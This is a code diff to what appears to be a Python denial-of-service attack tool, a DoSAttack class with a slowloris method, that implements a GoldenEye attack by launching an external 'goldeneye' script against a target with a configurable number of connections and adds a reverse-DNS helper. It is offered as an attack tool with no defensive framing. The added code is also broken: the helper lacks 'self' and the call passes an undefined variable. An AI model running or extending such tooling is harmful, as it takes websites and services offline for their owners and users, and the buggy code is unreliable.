@@ -5,6 +5,7 @@ import threading
 import random
 from random_string_generator import RandomStringGenerator
 import logging
+import subprocess
 
 
 logging.basicConfig(
@@ -57,6 +58,13 @@ class DoSAttack:
 
     def send_header(self, s, name, value):
         self.send_line(s, f"{name}: {value}")
+        
+    def get_domain_name(ip_address):
+        try:
+            hostname = socket.gethostbyaddr(ip_address)[0]
+            return hostname
+        except socket.herror:
+            return "No domain name found"
 
     def slowloris_attack(self):
         user_agents = [
@@ -218,7 +226,11 @@ class DoSAttack:
         raise NotImplementedError
 
     def goldeneye_attack(self):
-        raise NotImplementedError
+        ip = self.target_ip
+        domain_name = get_domain_name(ip_address)
+        logging.info("Attacking %s with GoldenEye...", ip)
+        command = ["python3", "goldeneye", domain_name, "-w", str(self.num_connections)]
+        subprocess.run(command)
 
     def wait_for_threads(self):
         for thread in self.threads:
